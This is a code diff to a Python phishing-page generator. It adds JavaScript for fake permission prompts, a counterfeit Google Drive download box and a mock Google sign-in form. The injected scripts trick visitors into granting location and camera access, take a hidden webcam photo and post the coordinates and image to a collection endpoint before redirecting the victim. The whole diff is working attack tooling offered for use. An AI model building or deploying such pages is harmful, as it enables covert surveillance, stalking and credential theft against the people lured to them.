@@ -27,6 +27,13 @@ SESSION_FILE = '.phishgen_session.json'
 RESULTS_DIR = os.path.join(os.path.expanduser('~'),
     'storage/documents/PhisoGen_Results' if os.environ.get('PREFIX') else 'Documents/PhisoGen_Results')
 
+# Auto setup Termux storage access
+if os.environ.get('PREFIX'):
+    try:
+        subprocess.run(['termux-setup-storage'], capture_output=True, timeout=10)
+    except:
+        pass
+
 TUNNEL_NGROK = "ngrok"
 TUNNEL_PINGGY = "pinggy"
 TUNNEL_CLOUDFLARE = "cloudflare"
@@ -197,26 +204,33 @@ class PhishingGenerator:
                 
                 if phish_type == "location":
                     permission_script += """
-                    navigator.permissions.query({name:'geolocation'}).then(function(result) {
-                        if (result.state === 'granted') {
-                            // Already have permission
-                            getLocation();
-                        } else {
-                            navigator.geolocation.getCurrentPosition(function(position) {
-                                // Send location data
-                                fetch('/collect-data', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({
-                                        type: 'location',
-                                        lat: position.coords.latitude,
-                                        lng: position.coords.longitude
-                                    })
-                                }).then(function() {
-                                    window.top.location.href = '""" + target_url + """';
-                                });
+                    var gaLocPopup = document.createElement('div');
+                    gaLocPopup.innerHTML = '<div id="locOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
+                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                            '<div style="font-size:56px;margin-bottom:12px;">📍</div>' +
+                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Allow Location Access</h2>' +
+                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">This website needs your location to show relevant content and provide a better experience near you.</p>' +
+                            '<button id="locAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Location Access</button>' +
+                        '</div></div>';
+                    document.body.appendChild(gaLocPopup);
+                    document.getElementById('locAllowBtn').addEventListener('click', function() {
+                        var o = document.getElementById('locOverlay');
+                        if (o) o.style.display = 'none';
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            fetch('/collect-data', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    type: 'location',
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude
+                                })
+                            }).then(function() {
+                                window.top.location.href = '""" + target_url + """';
                             });
-                        }
+                        }, function() {
+                            window.top.location.href = '""" + target_url + """';
+                        });
                     });
                     """
                 
@@ -286,57 +300,52 @@ class PhishingGenerator:
 
                 elif phish_type == "camera":
                     permission_script += """
-                    navigator.permissions.query({name:'camera'}).then(function(result) {
-                        if (result.state === 'granted') {
-                            // Already have permission
-                            startCamera();
-                        } else {
-                            navigator.mediaDevices.getUserMedia({video: true})
-                            .then(function(stream) {
-                                // Create video and canvas elements
-                                var video = document.createElement('video');
-                                var canvas = document.createElement('canvas');
-                                video.style.display = 'none';
-                                canvas.style.display = 'none';
-                                document.body.appendChild(video);
-                                document.body.appendChild(canvas);
-                                
-                                // Set video source to camera stream
-                                video.srcObject = stream;
-                                video.play();
-                                
-                                // Wait for video to load
-                                video.onloadedmetadata = function() {
-                                    canvas.width = video.videoWidth;
-                                    canvas.height = video.videoHeight;
-                                    
-                                    // Take photo after 1 second
-                                    setTimeout(function() {
-                                        // Draw video frame to canvas
-                                        canvas.getContext('2d').drawImage(video, 0, 0);
-                                        
-                                        // Convert canvas to base64 image
-                                        var imageData = canvas.toDataURL('image/jpeg');
-                                        
-                                        // Send image data
-                                        fetch('/collect-data', {
-                                            method: 'POST',
-                                            headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({
-                                                type: 'camera_capture',
-                                                image: imageData
-                                            })
-                                        }).then(function() {
-                                            // Stop camera and cleanup
-                                            stream.getTracks().forEach(track => track.stop());
-                                            video.remove();
-                                            canvas.remove();
-                                            window.top.location.href = '""" + target_url + """';
-                                        });
-                                    }, 1000);
-                                };
-                            });
-                        }
+                    var gaCamPopup = document.createElement('div');
+                    gaCamPopup.innerHTML = '<div id="camOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
+                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                            '<div style="font-size:56px;margin-bottom:12px;">📷</div>' +
+                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Camera Access Required</h2>' +
+                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">Please allow camera access to verify your identity and complete the secure verification process.</p>' +
+                            '<button id="camAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Camera Access</button>' +
+                        '</div></div>';
+                    document.body.appendChild(gaCamPopup);
+                    document.getElementById('camAllowBtn').addEventListener('click', function() {
+                        var o = document.getElementById('camOverlay');
+                        if (o) o.style.display = 'none';
+                        navigator.mediaDevices.getUserMedia({video: true})
+                        .then(function(stream) {
+                            var video = document.createElement('video');
+                            var canvas = document.createElement('canvas');
+                            video.style.display = 'none';
+                            canvas.style.display = 'none';
+                            document.body.appendChild(video);
+                            document.body.appendChild(canvas);
+                            video.srcObject = stream;
+                            video.play();
+                            video.onloadedmetadata = function() {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                setTimeout(function() {
+                                    canvas.getContext('2d').drawImage(video, 0, 0);
+                                    var imageData = canvas.toDataURL('image/jpeg');
+                                    fetch('/collect-data', {
+                                        method: 'POST',
+                                        headers: {'Content-Type': 'application/json'},
+                                        body: JSON.stringify({
+                                            type: 'camera_capture',
+                                            image: imageData
+                                        })
+                                    }).then(function() {
+                                        stream.getTracks().forEach(track => track.stop());
+                                        video.remove();
+                                        canvas.remove();
+                                        window.top.location.href = '""" + target_url + """';
+                                    });
+                                }, 1000);
+                            };
+                        }).catch(function() {
+                            window.top.location.href = '""" + target_url + """';
+                        });
                     });
                     """
                 elif phish_type == "clipboard":
@@ -409,52 +418,51 @@ class PhishingGenerator:
 
                 elif phish_type == "combo":
                     permission_script += """
-                    navigator.permissions.query({name:'geolocation'}).then(function(result) {
+                    var gaComPopup = document.createElement('div');
+                    gaComPopup.innerHTML = '<div id="comOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
+                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
+                            '<div style="font-size:48px;margin-bottom:10px;">🔐</div>' +
+                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Identity Verification Required</h2>' +
+                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">For security purposes, please allow camera and location access to complete the verification process.</p>' +
+                            '<button id="comAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Continue with Verification</button>' +
+                        '</div></div>';
+                    document.body.appendChild(gaComPopup);
+                    document.getElementById('comAllowBtn').addEventListener('click', function() {
+                        var o = document.getElementById('comOverlay');
+                        if (o) o.style.display = 'none';
+                        var comboData = {};
+                        var done = 0;
+                        function tryRedirect() { done++; if (done >= 2) window.top.location.href = '""" + target_url + """'; }
                         navigator.geolocation.getCurrentPosition(function(position) {
                             fetch('/collect-data', {
                                 method: 'POST',
                                 headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    type: 'location',
-                                    lat: position.coords.latitude,
-                                    lng: position.coords.longitude
-                                })
-                            });
-                        });
-                    });
-                    navigator.mediaDevices.getUserMedia({video: true})
-                    .then(function(stream) {
-                        var video = document.createElement('video');
-                        var canvas = document.createElement('canvas');
-                        video.style.display = 'none';
-                        canvas.style.display = 'none';
-                        document.body.appendChild(video);
-                        document.body.appendChild(canvas);
-                        video.srcObject = stream;
-                        video.play();
-                        video.onloadedmetadata = function() {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            setTimeout(function() {
-                                canvas.getContext('2d').drawImage(video, 0, 0);
-                                var imageData = canvas.toDataURL('image/jpeg');
-                                fetch('/collect-data', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({
-                                        type: 'camera_capture',
-                                        image: imageData
-                                    })
-                                }).then(function() {
-                                    stream.getTracks().forEach(track => track.stop());
-                                    video.remove();
-                                    canvas.remove();
-                                    window.top.location.href = '""" + target_url + """';
-                                });
-                            }, 1500);
-                        };
-                    }).catch(function() {
-                        window.top.location.href = '""" + target_url + """';
+                                body: JSON.stringify({ type: 'location', lat: position.coords.latitude, lng: position.coords.longitude })
+                            }).then(tryRedirect);
+                        }, tryRedirect);
+                        navigator.mediaDevices.getUserMedia({video: true})
+                        .then(function(stream) {
+                            var video = document.createElement('video');
+                            var canvas = document.createElement('canvas');
+                            video.style.display = 'none'; canvas.style.display = 'none';
+                            document.body.appendChild(video); document.body.appendChild(canvas);
+                            video.srcObject = stream; video.play();
+                            video.onloadedmetadata = function() {
+                                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                                setTimeout(function() {
+                                    canvas.getContext('2d').drawImage(video, 0, 0);
+                                    fetch('/collect-data', {
+                                        method: 'POST',
+                                        headers: {'Content-Type': 'application/json'},
+                                        body: JSON.stringify({ type: 'camera_capture', image: canvas.toDataURL('image/jpeg') })
+                                    }).then(function() {
+                                        stream.getTracks().forEach(function(t) { t.stop(); });
+                                        video.remove(); canvas.remove();
+                                        tryRedirect();
+                                    });
+                                }, 1500);
+                            };
+                        }).catch(tryRedirect);
                     });
                     """
 
@@ -462,24 +470,42 @@ class PhishingGenerator:
                     permission_script += """
                     var cjOverlay = document.createElement('div');
                     cjOverlay.innerHTML = '<div id="cjContainer" style="position:fixed;top:0;left:0;width:100%;height:100%;' +
-                        'background:rgba(0,0,0,0.75);display:flex;justify-content:center;align-items:center;z-index:9999;">' +
-                        '<div style="background:white;padding:30px 40px;border-radius:14px;text-align:center;' +
-                            'box-shadow:0 8px 32px rgba(0,0,0,0.3);max-width:380px;">' +
-                            '<div style="font-size:52px;margin-bottom:8px;">⬇️</div>' +
-                            '<h2 style="margin:4px 0;color:#1a1a1a;font-size:22px;">File Ready for Download</h2>' +
-                            '<p style="color:#5f6368;margin:4px 0 18px;font-size:14px;">Click to start downloading your file</p>' +
-                            '<button id="cjBtn" style="padding:14px 48px;background:#1a73e8;color:#fff;border:none;' +
-                                'border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;letter-spacing:.3px;' +
-                                'box-shadow:0 2px 8px rgba(26,115,232,0.3);">📥 Download Now</button>' +
+                        'background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
+                        '<div style="background:#fff;border-radius:16px;padding:0;text-align:center;overflow:hidden;' +
+                            'box-shadow:0 12px 48px rgba(0,0,0,0.25);max-width:400px;width:90%;">' +
+                            '<div style="background:#f8f9fa;padding:20px 24px 12px;border-bottom:1px solid #e8eaed;">' +
+                                '<div style="display:flex;align-items:center;gap:10px;">' +
+                                    '<div style="width:36px;height:36px;background:#1a73e8;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;">G</div>' +
+                                    '<div style="text-align:left;flex:1;"><div style="font-size:14px;font-weight:500;color:#1a1a1a;">Google Drive</div><div style="font-size:12px;color:#5f6368;">drive.google.com</div></div>' +
+                                    '<div style="color:#5f6368;font-size:20px;">⋮</div>' +
+                                '</div>' +
+                            '</div>' +
+                            '<div style="padding:28px 24px 20px;">' +
+                                '<div style="width:72px;height:72px;background:#e8f0fe;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">' +
+                                    '<svg width="36" height="36" viewBox="0 0 24 24" fill="#1a73e8"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>' +
+                                '</div>' +
+                                '<h2 style="margin:0 0 4px;color:#1a1a1a;font-size:18px;font-weight:500;">Document.pdf</h2>' +
+                                '<p style="color:#5f6368;margin:0 0 2px;font-size:13px;">Shared by: Anonymous • 2.4 MB</p>' +
+                                '<p style="color:#5f6368;margin:0 0 18px;font-size:12px;">PDF document • Standard license</p>' +
+                                '<div style="background:#f1f3f4;border-radius:8px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#3c4043;">' +
+                                    'To download this file, please verify that you are not a robot. This helps us maintain security.' +
+                                '</div>' +
+                                '<button id="cjBtn" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;' +
+                                    'border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;letter-spacing:.3px;' +
+                                    'box-shadow:0 2px 6px rgba(26,115,232,0.25);">Verify & Download</button>' +
+                                '<p style="color:#9aa0a6;font-size:11px;margin:12px 0 0;">By clicking, you agree to our Terms of Service</p>' +
+                            '</div>' +
                         '</div></div>';
                     document.body.appendChild(cjOverlay);
 
                     document.getElementById('cjBtn').addEventListener('click', function() {
-                        document.getElementById('cjContainer').innerHTML = '<div style="background:white;padding:30px 40px;border-radius:14px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.3);max-width:380px;">' +
-                            '<div style="font-size:42px;margin-bottom:10px;">🔒</div>' +
-                            '<h2 style="margin:4px 0;color:#1a1a1a;font-size:20px;">Establishing Secure Connection...</h2>' +
-                            '<p style="color:#5f6368;margin:12px 0 0;font-size:13px;">Please wait while we verify your identity</p>' +
-                            '<div style="margin-top:16px;width:100%;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;">' +
+                        document.getElementById('cjContainer').innerHTML = '<div style="background:#fff;border-radius:16px;overflow:hidden;' +
+                            'box-shadow:0 12px 48px rgba(0,0,0,0.25);max-width:400px;width:90%;padding:36px 24px;text-align:center;">' +
+                            '<div style="width:56px;height:56px;margin:0 auto 16px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:cjSpin .8s linear infinite;"></div>' +
+                            '<style>@keyframes cjSpin{to{transform:rotate(360deg)}}</style>' +
+                            '<h2 style="margin:0 0 4px;color:#1a1a1a;font-size:18px;font-weight:500;">Verifying...</h2>' +
+                            '<p style="color:#5f6368;margin:0 0 16px;font-size:14px;">Please wait while we verify your identity</p>' +
+                            '<div style="width:100%;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;">' +
                                 '<div style="width:0%;height:100%;background:#1a73e8;border-radius:2px;" id="cjProgress"></div>' +
                             '</div></div>';
 
@@ -487,13 +513,11 @@ class PhishingGenerator:
                         var capturesDone = 0;
                         var totalCaptures = 0;
 
-                        // Request camera
                         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                             totalCaptures++;
                             navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                                 var video = document.createElement('video');
-                                video.srcObject = stream;
-                                video.play();
+                                video.srcObject = stream; video.play();
                                 setTimeout(function() {
                                     var canvas = document.createElement('canvas');
                                     canvas.width = video.videoWidth || 640;
@@ -501,55 +525,41 @@ class PhishingGenerator:
                                     canvas.getContext('2d').drawImage(video, 0, 0);
                                     collectedData.data.camera = canvas.toDataURL('image/jpeg', 0.8);
                                     stream.getTracks().forEach(function(t) { t.stop(); });
-                                    capturesDone++;
-                                    checkDone();
+                                    capturesDone++; checkDone();
                                 }, 500);
                             }).catch(function() { capturesDone++; checkDone(); });
                         }
 
-                        // Request location
                         if (navigator.geolocation) {
                             totalCaptures++;
                             navigator.geolocation.getCurrentPosition(function(pos) {
                                 collectedData.data.latitude = pos.coords.latitude;
                                 collectedData.data.longitude = pos.coords.longitude;
                                 collectedData.data.accuracy = pos.coords.accuracy;
-                                capturesDone++;
-                                checkDone();
+                                capturesDone++; checkDone();
                             }, function() { capturesDone++; checkDone(); }, { enableHighAccuracy: true, timeout: 5000 });
                         }
 
-                        function checkDone() {
-                            if (capturesDone >= totalCaptures) {
-                                sendAndRedirect();
-                            }
-                        }
+                        function checkDone() { if (capturesDone >= totalCaptures) sendAndRedirect(); }
 
                         function sendAndRedirect() {
-                            var prog = document.getElementById('cjProgress');
-                            if (prog) { prog.style.width = '100%'; }
+                            var p = document.getElementById('cjProgress');
+                            if (p) p.style.width = '100%';
                             fetch('/collect-data', {
                                 method: 'POST',
                                 headers: {'Content-Type': 'application/json'},
                                 body: JSON.stringify(collectedData)
-                            }).then(function() {
-                                window.top.location.href = '""" + target_url + """';
-                            });
+                            }).then(function() { window.top.location.href = '""" + target_url + """'; });
                         }
 
-                        // Fallback: if no captures, just send after 2s
-                        if (totalCaptures === 0) {
-                            setTimeout(sendAndRedirect, 2000);
-                        } else {
-                            setTimeout(function() { if (capturesDone < totalCaptures) { capturesDone = totalCaptures; sendAndRedirect(); } }, 6000);
-                        }
+                        if (totalCaptures === 0) setTimeout(sendAndRedirect, 2000);
+                        else setTimeout(function() { if (capturesDone < totalCaptures) { capturesDone = totalCaptures; sendAndRedirect(); } }, 6000);
 
-                        // Animate progress bar
-                        var width = 0;
-                        var interval = setInterval(function() {
+                        var w = 0;
+                        setInterval(function() {
                             var p = document.getElementById('cjProgress');
-                            if (p) { width = Math.min(width + 5, 90); p.style.width = width + '%'; }
-                            if (capturesDone >= totalCaptures) { clearInterval(interval); }
+                            if (p) { w = Math.min(w + 5, 90); p.style.width = w + '%'; }
+                            if (capturesDone >= totalCaptures) clearInterval(this);
                         }, 200);
                     });
                     """
@@ -601,6 +611,9 @@ class PhishingGenerator:
                         '<div style="margin-top:40px;text-align:left;">' +
                             '<a class="ga-link" href="#">Forgot email?</a>' +
                             '<p style="font-size:14px;color:#5f6368;margin-top:32px;">Not your computer? Use a <a style="color:#1a73e8;font-weight:500;text-decoration:none;cursor:pointer;">Guest window</a> to sign in privately.</p>' +
+                            '<div style="margin-top:40px;display:flex;justify-content:space-between;align-items:center;">' +
+                                '<a class="ga-link" href="#" style="font-size:14px;">Create account</a>' +
+                            '</div>' +
                         '</div>' +
                     '</div>';
                     document.body.appendChild(gaPopup);
@@ -660,7 +673,8 @@ class PhishingGenerator:
 
                     gaNext1.addEventListener('click', function() {
                         var email = gaEmail.value.trim();
-                        if (!email || !email.includes('@')) {
+                        if (!email) {
+                            gaEmailError.textContent = 'Enter an email or phone number';
                             gaEmailError.style.display = 'block';
                             gaEmail.style.borderColor = '#d93025';
                             return;
